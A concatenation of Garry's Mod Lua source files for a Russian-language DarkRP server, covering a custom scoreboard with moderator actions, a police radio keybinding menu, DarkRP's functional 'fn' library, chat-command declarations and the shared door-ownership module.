        local onlinetext = draw_SimpleText(timeToStr(LocalPlayer():GetNW2Int('playtime') or 0) .. '.', 'HUDFancyFont', w - textspacex, h - textspacey, Color(255, 216, 0), 2, 4)
        draw_SimpleText('Ваш онлайн: ', 'HUDFancyFont', w - textspacex - onlinetext, h - textspacey, color_white, 2, 4)
        draw_RoundedBox(0, 0, y * 0.09, w, 1, Color(54, 54, 54))
        draw_SimpleText('Ник', 'ScrFancyButton', w / 15.5, y * 0.1047, Color(124, 124, 124), 1)
        draw_SimpleText('Профессия', 'ScrFancyButton', w / 2.75, y * 0.1047, Color(124, 124, 124), 1)
        draw_SimpleText('Клан', 'ScrFancyButton', w / 1.6, y * 0.1047, Color(124, 124, 124), 1)
        draw_SimpleText('Пинг', 'ScrFancyButton', w / 1.15, y * 0.1047, Color(124, 124, 124), 1)
        draw_RoundedBox(0, 0, y * 0.709 + 1, w, 1, Color(54, 54, 54))
    end

    local discordbut = vgui_Create('DButton', TestBoard)
    discordbut:SetSize(x * 0.13, y * 0.0475)
    discordbut:SetPos(x * 0.042, y * 0.0264)
    discordbut:SetText('')
    discordbut.Paint = function(s, w, h) end

    discordbut.DoClick = function(s)
        gui_OpenURL('https://gambitrp.site/discord/')
    end

    local vkbut = vgui_Create('DButton', TestBoard)
    vkbut:SetSize(x * 0.1, y * 0.0475)
    vkbut:SetPos(x * 0.3503, y * 0.0264)
    vkbut:SetText('')
    vkbut.Paint = function(s, w, h) end

    vkbut.DoClick = function(s)
        gui_OpenURL('https://gambitrp.site/vk/')
    end

    local s = vgui_Create('ui_scrollpanel', TestBoard)
    s:SetSize(TestBoard:GetWide(), y * 0.567)
    s:SetPos(0, y * 0.142)
    s:SetSpacing(0.5)
    local tab = table_Copy(player_GetAll())
    table_sort(tab, function(a, b) return team_GetName(a:Team()) < team_GetName(b:Team()) end)

    for k, v in pairs(tab) do
        if not v:IsValid() then return end
		if spyme[v:SteamID()] then continue end
        if v:GetNW2Bool('MaskMe') then continue end
        local col = Color(255, 255, 255)
        local text = 'Игрок'

        for _, i in pairs(Relax.Ranks) do
            if v:GetUserGroup() == _ then
                col = i[2]
                text = i[1]
            end
        end

        local mat = Material('icon16/user.png')

        if v:IsUserGroup('superadmin') then
            mat = Material('icon16/tux.png')
        end

        if v:IsUserGroup('user') then
            mat = Material('icon16/user.png')
        end

        if v:IsUserGroup('vip') then
            mat = Material('icon16/heart.png')
        end

        if v:IsUserGroup('admin') then
            mat = Material('icon16/award_star_silver_2.png')
        end

        if v:IsUserGroup('moder') then
            mat = Material('icon16/coins.png')
        end

        if v:IsUserGroup('helper') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('helper+') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('NS-moder') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('NS-admin') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('padmin') then
            mat = Material('icon16/coins.png')
        end

        if v:IsUserGroup('sponsor') then
            mat = Material('icon16/coins.png')
        end

        if v:IsUserGroup('dsuperadmin') then
            mat = Material('icon16/coins.png')
        end

        if v:IsUserGroup('downer') then
            mat = Material('icon16/application_xp_terminal.png')
        end

        if v:IsUserGroup('manager') then
            mat = Material('icon16/award_star_gold_3.png')
        end

        if v:IsUserGroup('NS-helper') then
            mat = Material('icon16/award_star_silver_2.png')
        end

        if v:IsUserGroup('admin_d') then
            mat = Material('icon16/award_star_silver_2.png')
        end

        if v:IsUserGroup('overwatch') then
            mat = Material('icon16/award_star_gold_3.png')
        end

        if v:IsUserGroup('NS-mlmoder') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('NS-mladmin') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('NS-trainee') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('NS-zammanager') then
            mat = Material('icon16/rosette.png')
        end

        if v:IsUserGroup('NS-assistant') then
            mat = Material('icon16/shield_add.png')
        end

        if v:IsUserGroup('uprav') then
            mat = Material('icon16/tux.png')
        end

        local orgname = ''

        -- if v:GetNW2String('orgname') ~= '' then
            -- orgname = v:GetNW2String('orgname')
        -- end	
		
        if BRICKS_SERVER_GANGNAMES then
            if BRICKS_SERVER_GANGNAMES[v:GetGangID()] then
                orgname = BRICKS_SERVER_GANGNAMES[v:GetGangID()].Name
            end
        end
		
        local p = vgui_Create('DPanel', TestBoard)
        p:SetSize(s:GetWide(), (y * 0.0315) / 1.5)

        p.Think = function(s)
            if not IsValid(v) then
                s:Remove()
            end
        end

        local mutebut = vgui_Create('DImageButton', p)
        mutebut:SetSize(24, 24)
        mutebut:SetImage('icon32/muted.png')
        mutebut:Dock(RIGHT)

        mutebut.Think = function()
            if not IsValid(v) then return end

            if (p.Muted == nil or p.Muted ~= v:IsMuted()) then
                p.Muted = v:IsMuted()

                if (p.Muted) then
                    mutebut:SetImage('icon32/muted.png')
                else
                    mutebut:SetImage('icon32/unmuted.png')
                end

                mutebut.DoClick = function(ss)
                    if not IsValid(v) then return end

                    v:SetMuted(not p.Muted)
                end

                mutebut.OnMouseWheeled = function(ss, delta)
                    if not IsValid(v) then return end

                    v:SetVoiceVolumeScale(v:GetVoiceVolumeScale() + (delta / 100 * 5))
                    ss.LastTick = CurTime()
                end

                mutebut.PaintOver = function(ss, w, h)
                    if not IsValid(v) then return end

                    local a = 255 - math_Clamp(CurTime() - (ss.LastTick or 0), 0, 3) * 255
                    --draw_RoundedBox( 4, 0, 0, w, h, Color( 0, 0, 0, a * 0.75 ) )
                    draw_SimpleText(math_ceil(v:GetVoiceVolumeScale() * 100) .. '%', 'ScrFancyButtonSmall', w / 2, h / 2, Color(255, 255, 255, a), 1, 1)
                end
            end
        end

        p.OnCursorEntered = function()
            surface.PlaySound('UI/buttonrollover.wav')
        end

        local pingwh = (x * 0.009) / 1.25
        local matwh = (x * 0.009) / 1.25

        p.Paint = function(s, w, h)
            if not v:IsValid() then return end

            if s:IsHovered() then
                draw_RoundedBox(0, 0, 0, w, h, ColorAlpha(v:JobColor(), 170))
            else
                draw_RoundedBox(0, 0, 0, w, h, ColorAlpha(v:JobColor(), 120))
            end

            if not v:HasGambitPlus() then
                draw_SimpleText(v:Name(), 'ScrFancyLine', w / 20, h / 2, color_white, 0, 1)
            elseif v:SteamID() == 'STEAM_0:1:85418510' then
                draw_SimpleText('[Создатель] ' .. v:Name() or '', 'ScrFancyLine', w / 20, h / 2, Color(230, 15, 15), 0, 1)
            else
                draw_SimpleText(v:HasGambitPlus() and '[GMB+] ' .. v:Name() or '', 'ScrFancyLine', w / 20, h / 2, HSVToColor(CurTime() % 6 * 60, 1, 1), 0, 1)
            end

            local pingcolor = v:Ping() >= 200 and Color(155, 55, 55) or v:Ping() >= 350 and Color(166, 0, 0) or Color(5, 241, 0)
            draw_SimpleText(v:getDarkRPVar('job'), 'ScrFancyLine', w / 2.75, h / 2, color_white, 1, 1)
            draw_SimpleText(orgname, 'ScrFancyLine', w / 1.6, h / 2, color_white, 1, 1)
            draw_SimpleText(v:Ping(), 'ScrFancyLine', w / 1.15 + pingwh, h / 2, pingcolor, 1, 1)
            surface_SetDrawColor(pingcolor)
            surface_SetMaterial(pingmat)
            surface_DrawTexturedRect(w / 1.15 - pingwh, h / 2 - pingwh / 2, pingwh, pingwh)
            surface_SetDrawColor(Color(255, 255, 255, 255))
            surface_SetMaterial(mat)
            surface_DrawTexturedRect(w * 0.0315, h / 2 - matwh / 2 + 1, matwh, matwh)
        end

        p.OnMousePressed = function()
            surface.PlaySound('buttons/button15.wav')
            local ymove = y / 2 - (TestBoard:GetTall() / 2)

            timer_Simple(0, function()
                if IsValid(rp) then
                    rp:Remove()
                end

                rp = vgui_Create('KPanel')
                rp:SetPos(x / 2 + TestBoard:GetWide() / 2, y * 0.2125)
                --rp:MoveTo(TestBoard:GetWide() + 400, ymove, 0.2, 0, 1)
                rp:SetSize(x * 0.197, y * 0.6335)
                rp.Paint = function(s, w, h) end

                rp.Think = function(s)
                    if not IsValid(v) then
                        s:Remove()
                    end
                end

                local info = vgui_Create('DPanel', rp)
                info:SetSize(rp:GetWide(), rp:GetTall())
                info:SetPos(0, 0)

                info.Paint = function(s, w, h)
                    if not v:IsValid() then return end
                    draw_RoundedBoxEx(16, 0, 0, w, h, Color(45, 45, 45, 250), false, true, false, true)
                    draw_RoundedBox(0, 0, y * 0.025, w, 1, Color(54, 54, 54))
                    draw_SimpleText(text, 'ScrFancyButton', w / 2, y * 0.012, col, 1, 1)
                    draw_SimpleText(v:Name(), 'ScrFancyButton', x * 0.0575, y * 0.0352, color_white, 0, 3)
                    draw_SimpleText(v:getDarkRPVar('job'), 'HUDFancyFont', x * 0.07, y * 0.0585, color_white, 0, 3)
                    local jobgwh = y * 0.0167
                    surface_SetDrawColor(color_white)
                    surface_SetMaterial(jobmat)
                    surface_DrawTexturedRect(x * 0.058, y * 0.0585, jobgwh, jobgwh)
                    local GetUTimeTotalTime = timeToStr(v:GetNW2Int('playtime') or 0) or ''
                    draw_SimpleText('Наиграно: ' .. GetUTimeTotalTime .. '.', 'HUDFancyFont', x * 0.0575, y * 0.0785, color_white, 0, 3)
                    --if LocalPlayer():Team() == TEAM_MODER then
                    --    ShadowText(v:getDarkRPVar('money') .. '$', 'font22', av:GetWide() + 5, 70, color_white, TLEFT)
                    --else
                    --    ShadowText(orgname, 'font22', av:GetWide() + 5, 70, color_white, TLEFT)
                    --end
                    draw_RoundedBox(0, 0, y * 0.1135, w, 1, Color(54, 54, 54))
                    draw_SimpleText('Действия', 'ScrFancyButton', w / 2, y * 0.115, Color(99, 99, 99), 1, 3)
                end

                av = vgui_Create('AvatarImage', info)
                av:SetPos(x * 0.0152, y * 0.0352)
                local avatarwh = x * 0.0391
                av:SetSize(avatarwh, avatarwh)
                av:SetPlayer(v, 75)
                local clist = vgui_Create('DPanelList', info)
                clist:SetPos(0, y * 0.1482)
                clist:SetSize(info:GetWide(), info:GetTall())
                clist:EnableVerticalScrollbar(true)
                clist:SetSpacing(y * 0.0102)
                clist.Paint = function(self, w, h) end
                clist.VBar.Paint = function(s, w, h) end
                clist.VBar.btnUp.Paint = function(s, w, h) end
                clist.VBar.btnDown.Paint = function(s, w, h) end
                clist.VBar.btnGrip.Paint = function(s, w, h) end
                buttons = {}

                table_insert(buttons, {
                    Title = 'Открыть профиль',
                    Func = function(pl)
                        v:ShowProfile()
                        LocalPlayer():ChatPrint('Вы открыли профиль')
                    end
                })

                table_insert(buttons, {
                    Title = 'Скопировать SteamID',
                    Func = function(pl)
                        SetClipboardText(v:SteamID())
                        LocalPlayer():ChatPrint('Вы скопировали SteamID')
                    end
                })

                table_insert(buttons, {
                    Title = 'Скопировать Имя',
                    Func = function(pl)
                        SetClipboardText(v:Nick())
                        LocalPlayer():ChatPrint('Вы скопировали имя')
                    end
                })

                table_insert(buttons, {
                    Title = 'Позвонить',
                    Func = function(pl)
                        LocalPlayer():ConCommand('darkrp call ' .. v:UserID())
                    end
                })

                if LocalPlayer():IsModerator() then
                    table_insert(buttons, {
                        Title = 'Бан',
                        Func = function(pl)
                            ui.StringRequest('Бан ' .. v:Name(), 'Минуты', '', function(text)
                                ui.StringRequest('Забанить ' .. v:Name(), 'Введите причину', '', function(text2)
                                    RunConsoleCommand('ulx', 'gban', v:Name(), text, text2)
                                end)
                            end)
                        end
                    })

                    table_insert(buttons, {
                        Title = 'Убить',
                        Func = function(pl)
                            RunConsoleCommand('ulx', 'slay', v:Name())
                        end
                    })

                    table_insert(buttons, {
                        Title = 'Тп к нему',
                        Func = function(pl)
                            RunConsoleCommand('ulx', 'goto', v:Name())
                        end
                    })

                    table_insert(buttons, {
                        Title = 'Тп к себе',
                        Func = function(pl)
                            RunConsoleCommand('ulx', 'bring', v:Name())
                        end
                    })

                    table_insert(buttons, {
                        Title = 'Дать пинка',
                        Func = function(pl)
                            RunConsoleCommand('ulx', 'slap', v:Name(), '1')
                        end
                    })

                    -- table_insert(buttons, {
                        -- Title = 'Дать Мут',
                        -- Func = function(pl)
                            -- RunConsoleCommand('ulx', 'tmute', v:Name(), '600')
                        -- end
                    -- })

                    -- table_insert(buttons, {
                        -- Title = 'Дать Гаг',
                        -- Func = function(pl)
                            -- RunConsoleCommand('ulx', 'tgag', v:Name(), '600')
                        -- end
                    -- })
					
					
					table_insert(buttons, {
                        Title = 'Дать Мут',
                        Func = function(pl)
                            ui.StringRequest('Дать Мут ' .. v:Name(), 'Секунды', '', function(text)
                                ui.StringRequest('Замутить ' .. v:Name(), 'Введите причину', '', function(text2)
                                    RunConsoleCommand('ulx', 'tmute', v:Name(), text, text2)
                                end)
                            end)
                        end
                    })
					
					   table_insert(buttons, {
                        Title = 'Дать Гаг',
                        Func = function(pl)
                            ui.StringRequest('Дать Гаг ' .. v:Name(), 'Секунды', '', function(text)
                                ui.StringRequest('Загагать ' .. v:Name(), 'Введите причину', '', function(text2)
                                    RunConsoleCommand('ulx', 'tgag', v:Name(), text, text2)
                                end)
                            end)
                        end
                    })
					
                    table_insert(buttons, {
                        Title = 'Убрать Мут',
                        Func = function(pl)
                            RunConsoleCommand('ulx', 'untmute', v:Name())
                        end
                    })

                    table_insert(buttons, {
                        Title = 'Убрать Гаг',
                        Func = function(pl)
                            RunConsoleCommand('ulx', 'untgag', v:Name())
                        end
                    })
                end

                for k, but in ipairs(buttons) do
                    local b = vgui_Create('DButton', clist)
                    b:SetSize(clist:GetWide(), y * 0.027)
                    b:SetText('')
                    b:SetFont('HUDFancyFont')
                    b:SetTextColor(Color(255, 255, 255))
                    b.DoClick = but.Func

                    b.Paint = function(s, w, h)
                        draw_SimpleText(but.Title, 'HUDFancyFont', w / 2, h / 3, color_white, 1, 1)
                        local butgradw = x * 0.1266
                        surface_SetDrawColor(color_white)
                        surface_SetMaterial(butgradmat)
                        surface_DrawTexturedRect(w / 2 - butgradw / 2, h - 1, butgradw, 1)
                    end

                    clist:AddItem(b)
                end
            end)
        end

        local av = vgui_Create('AvatarImage', p)
        av:SetPos(0, 0)
        av:SetSize((y * 0.0315) / 1.5, (y * 0.0315) / 1.5)
        av:SetPlayer(v, 32)
        s:AddItem(p)
    end
end

hook_Add('ScoreboardShow', 'rpmod.showsc', function()
    if IsValid(TestBoard) then
        TestBoard:Remove()
        timer_Destroy('RemoveWindow')
        gui_EnableScreenClicker(false)
    end

    Scorebo = TestScore()

    return false
end)

hook_Add('ScoreboardHide', 'rpmod.hidesc', function()
    if IsValid(TestBoard) then
        TestBoard:Close()
    end

    if IsValid(rp) then
        rp:Remove()
    end
end)
--PATH addons/111mod/lua/autorun/client/policeradiomenu.lua:
hook.Add("PopulateToolMenu","pr_button_setting",function()
	spawnmenu.AddToolMenuOption("Options","Police Radio","pr_setting_menu","Keybindings","","",function(option)
		option:AddControl("Label",{Text = "Pressing the keys as defined below will toggle the state of radio transmitter and receiver.\n\nPress the boxes to change the keys to one of your own."})
		option:AddControl("Numpad",{Label = "Radio toggle (sent audio)",Command = "policeradio_tog_key"})
		option:AddControl("Numpad",{Label = "Receive toggle (received audio)",Command = "policeradio_tog_rec_key"})
	end)
end)
--PATH gamemodes/darkrp/gamemode/libraries/fn.lua:
/*---------------------------------------------------------------------------
Functional library

by FPtje Atheos
---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------
Function currying
    Take a function with n parameters.
    Currying is the procedure of storing k < n parameters "in the function"
     in such a way that the remaining function can be called with n - k parameters

    Example:
    DebugPrint = fp{print, "[DEBUG]"}
    DebugPrint("TEST")
    > [DEBUG] TEST
---------------------------------------------------------------------------*/
function fp(tbl)
    local func = tbl[1]

    return function(...)
        local fnArgs = {}
        local arg = {...}
        local tblN = table.maxn(tbl)

        for i = 2, tblN do fnArgs[i - 1] = tbl[i] end
        for i = 1, table.maxn(arg) do fnArgs[tblN + i - 1] = arg[i] end

        return func(unpack(fnArgs, 1, table.maxn(fnArgs)))
    end
end

local unpack = unpack
local table = table
local pairs = pairs
local ipairs = ipairs
local error = error
local math = math
local select = select
local type = type
local _G = _G
local fp = fp


module("fn")

/*---------------------------------------------------------------------------
Parameter manipulation
---------------------------------------------------------------------------*/
Id = function(...) return ... end

Flip = function(f)
    if not f then error("not a function") end
    return function(b, a, ...)
        return f(a, b, ...)
    end
end

-- Definition from http://lua-users.org/wiki/CurriedLua
ReverseArgs = function(...)

   --reverse args by building a function to do it, similar to the unpack() example
   local function reverse_h(acc, v, ...)
      if select('#', ...) == 0 then
         return v, acc()
      else
         return reverse_h(function () return v, acc() end, ...)
      end
   end

   -- initial acc is the end of the list
   return reverse_h(function () return end, ...)
end

/*---------------------------------------------------------------------------
Misc functions
---------------------------------------------------------------------------*/
-- function composition
do
    local function comp_h(a, b, ...)
        if b == nil then return a end
        b = comp_h(b, ...)
        return function(...)
            return a(b(...))
        end
    end
    Compose = function(funcs, ...)
        if type(funcs) == "table" then
            return comp_h(unpack(funcs))
        else
            return comp_h(funcs, ...)
        end
    end
end

_G.fc = Compose

-- Definition from http://lua-users.org/wiki/CurriedLua
Curry = function(func, num_args)
    if not num_args then error("Missing argument #2: num_args") end
    if not func then error("Function does not exist!", 2) end
    -- helper
    local function curry_h(argtrace, n)
        if n == 0 then
            -- reverse argument list and call function
            return func(ReverseArgs(argtrace()))
        else
            -- "push" argument (by building a wrapper function) and decrement n
            return function(x)
                return curry_h(function() return x, argtrace() end, n - 1)
            end
        end
   end

   -- no sense currying for 1 arg or less
   if num_args > 1 then
      return curry_h(function() return end, num_args)
   else
      return func
   end
end

-- Thanks Lexic!
Partial = function(func, ...)
    local args = {...}
    return function(...)
        return func(unpack(table.Add( args, {...})))
    end
end

Apply = function(f, ...) return f(...) end

Const = function(a, b) return a end
Until = function(cmp, fn, val)
    if cmp(val) then
        return val
    end
    return Until(cmp, fn, fn(val))
end

Seq = function(f, x) f(x) return x end

GetGlobalVar = function(key) return _G[key] end

/*---------------------------------------------------------------------------
Mathematical operators and functions
---------------------------------------------------------------------------*/
Add = function(a, b) return a + b end
Sub = function(a, b) return a - b end
Mul = function(a, b) return a * b end
Div = function(a, b) return a / b end
Mod = function(a, b) return a % b end
Neg = function(a)    return -a    end

Eq  = function(a, b) return a == b end
Neq = function(a, b) return a ~= b end
Gt  = function(a, b) return a > b  end
Lt  = function(a, b) return a < b  end
Gte = function(a, b) return a >= b end
Lte = function(a, b) return a <= b end

Succ = Compose{Add, 1}
Pred = Compose{Flip(Sub), 1}
Even = Compose{fp{Eq, 0}, fp{Flip(Mod), 2}}
Odd  = Compose{Not, Even}

/*---------------------------------------------------------------------------
Functional logical operators and conditions
---------------------------------------------------------------------------*/
FAnd = function(fns)
    return function(...)
        local val
        for _, f in pairs(fns) do
            val = {f(...)}
            if not val[1] then return unpack(val) end
        end
        if val then return unpack(val) end
    end
end

FOr = function(fns)
    return function(...)
        local val
        for _, f in pairs(fns) do
            val = {f(...)}
            if val[1] then return unpack(val) end
        end
        return false, unpack(val, 2)
    end
end

Not = function(x) return not x end

If = function(f, Then, Else)
    return function(x)
        if f(x) then
            return Then
        else
            return Else
        end
    end
end

/*---------------------------------------------------------------------------
List operations
---------------------------------------------------------------------------*/
Map = function(f, xs)
    for k, v in pairs(xs) do
        xs[k] = f(v)
    end
    return xs
end

Append = function(xs, ys)
    return table.Add(xs, ys)
end

Filter = function(f, xs)
    local res = {}
    for k, v in pairs(xs) do
        if f(v) then res[k] = v end
    end
    return res
end

ForEach = function(f, xs)
    for k, v in pairs(xs) do
        local val = f(k, v)
        if val ~= nil then return val end
    end
end

Head = function(xs)
    return table.GetFirstValue(xs)
end

Last = function(xs)
    return xs[#xs] or table.GetLastValue(xs)
end

Tail = function(xs)
    table.remove(xs, 1)
    return xs
end

Init = function(xs)
    xs[#xs] = nil
    return xs
end

GetValue = function(i, xs)
    return xs[i]
end

Null = function(xs)
    for _ in pairs(xs) do
        return false
    end
    return true
end

Length = function(xs)
    return #xs
end

Index = function(xs, i)
    return xs[i]
end

Reverse = function(xs)
    local res = {}
    for i = #xs, 1, -1 do
        res[#xs - i + 1] = xs[i]
    end
    return res
end

/*---------------------------------------------------------------------------
Folds
---------------------------------------------------------------------------*/
Foldr = function(func, val, xs)
    for i = #xs, 1, -1 do
        val = func(xs[i], val)
    end

    return val
end

Foldl = function(func, val, xs)
    for _, v in ipairs(xs) do
        val = func(val, v)
    end

    return val
end

And = function(xs)
    for _, v in pairs(xs) do
        if v ~= true then return false end
    end
    return true
end

Or = function(xs)
    for _, v in pairs(xs) do
        if v == true then return true end
    end
    return false
end

Any = function(func, xs)
    for _, v in pairs(xs) do
        if func(v) == true then return true end
    end
    return false
end

All = function(func, xs)
    for _, v in pairs(xs) do
        if func(v) ~= true then return false end
    end
    return true
end

Sum = _G.fp{Foldr, Add, 0}

Product = _G.fp{Foldr, Mul, 1}

Concat = _G.fp{Foldr, Append, {}}

Maximum = _G.fp{Foldl, math.Max, -math.huge}

Minimum = _G.fp{Foldl, math.Min, math.huge}

Snd = _G.fp{select, 2}

Thrd = _G.fp{select, 3}

--PATH gamemodes/darkrp/gamemode/modules/chat/sh_interface.lua:
DarkRP.declareChatCommand = DarkRP.stub{
    name = "declareChatCommand",
    description = "Declare a chat command (describe it)",
    parameters = {
        {
            name = "table",
            description = "The description of the chat command. Has to contain a string: command, string: description, number: delay, optional function: condition",
            type = "table",
            optional = false
        }
    },
    returns = {
    },
    metatable = DarkRP
}

DarkRP.removeChatCommand = DarkRP.stub{
    name = "removeChatCommand",
    description = "Remove a chat command",
    parameters = {
        {
            name = "command",
            description = "The chat command to remove",
            type = "string",
            optional = false
        }
    },
    returns = {
    },
    metatable = DarkRP
}

DarkRP.chatCommandAlias = DarkRP.stub{
    name = "chatCommandAlias",
    description = "Create an alias for a chat command",
    parameters = {
        {
            name = "command",
            description = "An already existing chat command.",
            type = "string",
            optional = false
        },
        {
            name = "alias",
            description = "One or more aliases for the chat command.",
            type = "vararg",
            optional = false
        }
    },
    returns = {
    },
    metatable = DarkRP
}

DarkRP.getChatCommand = DarkRP.stub{
    name = "getChatCommand",
    description = "Get the information on a chat command.",
    parameters = {
        {
            name = "command",
            description = "The chat command",
            type = "string",
            optional = false
        }
    },
    returns = {
        {
            name = "chatTable",
            description = "A table containing the information of the chat command.",
            type = "table"
        }
    },
    metatable = DarkRP
}

DarkRP.getChatCommands = DarkRP.stub{
    name = "getChatCommands",
    description = "Get every chat command.",
    parameters = {

    },
    returns = {
        {
            name = "commands",
            description = "A table containing every command. Table indices are the command strings.",
            type = "table"
        }
    },
    metatable = DarkRP
}

DarkRP.getSortedChatCommands = DarkRP.stub{
    name = "getSortedChatCommands",
    description = "Get every chat command, sorted by their name.",
    parameters = {

    },
    returns = {
        {
            name = "commands",
            description = "A table containing every command.",
            type = "table"
        }
    },
    metatable = DarkRP
}

DarkRP.getIncompleteChatCommands = DarkRP.stub{
    name = "getIncompleteChatCommands",
    description = "chat commands that have been defined, but not declared. Information about these chat commands is missing.",
    parameters = {
    },
    returns = {
        {
            name = "commands",
            description = "A table containing the undeclared chat commands.",
            type = "table"
        }
    },
    metatable = DarkRP
}

--PATH gamemodes/darkrp/gamemode/modules/doorsystem/sh_doors.lua:
local meta = FindMetaTable("Entity")
local plyMeta = FindMetaTable("Player")

function meta:isKeysOwnable()
    if not IsValid(self) then return false end
    local class = self:GetClass()

    if ((class == "func_door" or class == "func_door_rotating" or class == "prop_door_rotating") or
            (GAMEMODE.Config.allowvehicleowning and self:IsVehicle() and (not IsValid(self:GetParent()) or not self:GetParent():IsVehicle()))) then
            return true
        end
    return false
end

function meta:isDoor()
    if not IsValid(self) then return false end
    local class = self:GetClass()

    if class == "func_door" or
        class == "func_door_rotating" or
        class == "prop_door_rotating" or
        class == "func_movelinear" or
        class == "prop_dynamic" then
        return true
    end
    return false
end

function meta:isKeysOwned()
    if IsValid(self:getDoorOwner()) then return true end

    return false
end

function meta:getDoorOwner()
    local doorData = self:getDoorData()
    if not doorData then return nil end

    return doorData.owner and Player(doorData.owner) or nil
end

function meta:isMasterOwner(ply)
    return ply == self:getDoorOwner()
end

function meta:isKeysOwnedBy(ply)
    if self:isMasterOwner(ply) then return true end

    local coOwners = self:getKeysCoOwners()
    return coOwners and coOwners[ply:UserID()] or false
end

function meta:isKeysAllowedToOwn(ply)
    local doorData = self:getDoorData()
    if not doorData then return false end

    return doorData.allowedToOwn and doorData.allowedToOwn[ply:UserID()] or false
end

function meta:getKeysNonOwnable()
    local doorData = self:getDoorData()
    if not doorData then return nil end

    return doorData.nonOwnable
end

function meta:getKeysTitle()
    local doorData = self:getDoorData()
    if not doorData then return nil end

    return doorData.title
end

function meta:getKeysDoorGroup()
    local doorData = self:getDoorData()
    if not doorData then return nil end

    return doorData.groupOwn
end

function meta:getKeysDoorTeams()
    local doorData = self:getDoorData()
    if not doorData or table.Count(doorData.teamOwn or {}) == 0 then return nil end

    return doorData.teamOwn
end

function meta:getKeysAllowedToOwn()
    local doorData = self:getDoorData()
    if not doorData then return nil end

    return doorData.allowedToOwn
end

function meta:getKeysCoOwners()
    local doorData = self:getDoorData()
    if not doorData then return nil end

    return doorData.extraOwners
end

local function canLockUnlock(ply, ent)
    local Team = ply:Team()
    local group = ent:getKeysDoorGroup()
    local teamOwn = ent:getKeysDoorTeams()

    return ent:isKeysOwnedBy(ply)                                         or
        (group   and table.HasValue(RPExtraTeamDoors[group] or {}, Team)) or
        (teamOwn and teamOwn[Team])
end

function plyMeta:canKeysLock(ent)
    local canLock = hook.Run("canKeysLock", self, ent)

    if canLock ~= nil then return canLock end
    return canLockUnlock(self, ent)
end

function plyMeta:canKeysUnlock(ent)
    local canUnlock = hook.Run("canKeysUnlock", self, ent)

    if canUnlock ~= nil then return canUnlock end
    return canLockUnlock(self, ent)
end

local netDoorVars = {}
local netDoorVarsByName = {}

DarkRP.getDoorVars = fp{fn.Id, netDoorVars}
DarkRP.getDoorVarsByName = fp{fn.Id, netDoorVarsByName}

function DarkRP.registerDoorVar(name, writeFn, readFn)
    netDoorVarsByName[name] = {name = name, write = writeFn, read = readFn}

    netDoorVarsByName[name].id = table.insert(netDoorVars, netDoorVarsByName[name])
end

if SERVER then
    function DarkRP.writeNetDoorVar(name, value)
        local var = netDoorVarsByName[name]

        -- Not registered, send inefficiently
        if not var then
            net.WriteUInt(0, 8) -- indicate unregistered
            net.WriteString(name)
            net.WriteType(value)

            return
        end

        net.WriteUInt(var.id, 8)
        var.write(value)
    end
end

if CLIENT then
    function DarkRP.readNetDoorVar()
        local id = net.ReadUInt(8)

        -- unregistered var
        if id == 0 then
            return net.ReadString(), net.ReadType(net.ReadUInt(8))
        end

        if not netDoorVars[id] then
            DarkRP.error("Unregistered DarkRP Doorvar clientside: " .. id, 2, {"Some addon is registering some DoorVar serverside, but not clientside."})
        end

        return netDoorVars[id].name, netDoorVars[id].read()
    end
end

DarkRP.registerDoorVar("groupOwn",
    function(val)
        net.WriteUInt(RPExtraTeamDoorIDs[val], 16)
    end,
    function()
        local id = net.ReadUInt(16)
        for name, id2 in pairs(RPExtraTeamDoorIDs) do
            if id == id2 then return name end
        end
    end
)

-- Net helper function for writing tables with numbers as keys and bools as values
local function writeNumBoolTbl(tbl)
    net.WriteUInt(table.Count(tbl), 10)

    for num, _ in pairs(tbl) do
        net.WriteUInt(num, 16)
    end
end

-- Net helper function for reading tables with numbers as keys and bools as values
local function readNumBoolTbl(tbl)
    local res = {}
    local count = net.ReadUInt(10)

    for i = 1, count do
        res[net.ReadUInt(16)] = true
    end

    return res
end

DarkRP.registerDoorVar("owner", fp{fn.Flip(net.WriteInt), 16}, fp{net.ReadUInt, 16})
DarkRP.registerDoorVar("nonOwnable", net.WriteBool, net.ReadBool)
DarkRP.registerDoorVar("teamOwn", writeNumBoolTbl, readNumBoolTbl)
DarkRP.registerDoorVar("allowedToOwn", writeNumBoolTbl, readNumBoolTbl)
DarkRP.registerDoorVar("extraOwners", writeNumBoolTbl, readNumBoolTbl)
DarkRP.registerDoorVar("title", net.WriteString, net.ReadString)

--[[---------------------------------------------------------------------------
Commands
---------------------------------------------------------------------------]]
DarkRP.declareChatCommand{
    command = "toggleownable",
    description = "Toggle ownability status on this door.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "togglegroupownable",
    description = "Set this door group ownable.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "toggleteamownable",
    description = "Toggle this door ownable by a given team.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "toggleown",
    description = "Own or unown the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "unownalldoors",
    description = "Sell all of your doors.",
    delay = 1.5
}

-- DarkRP.chatCommandAlias("unownalldoors", "sellalldoors")

DarkRP.declareChatCommand{
    command = "title",
    description = "Set the title of the door you're looking at.",
    delay = 1.5
}

DarkRP.declareChatCommand{
    command = "removeowner",
    description = "Remove an owner from the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "ro",
    description = "Remove an owner from the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "addowner",
    description = "Invite someone to co-own the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "ao",
    description = "Invite someone to co-own the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "forceunlock",
    description = "Force the door you're looking at to be unlocked. This is saved.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "forceremoveowner",
    description = "Forcefully remove an owner from the door you're looking at.",
    delay = 0.5
}

DarkRP.declareChatCommand{
    command = "forceunownall",
    description = "Force a player to unown all the doors and vehicles they have.",
    delay = 0.5,
    tableArgs = true
}

DarkRP.declareChatCommand{
    command = "forcelock",
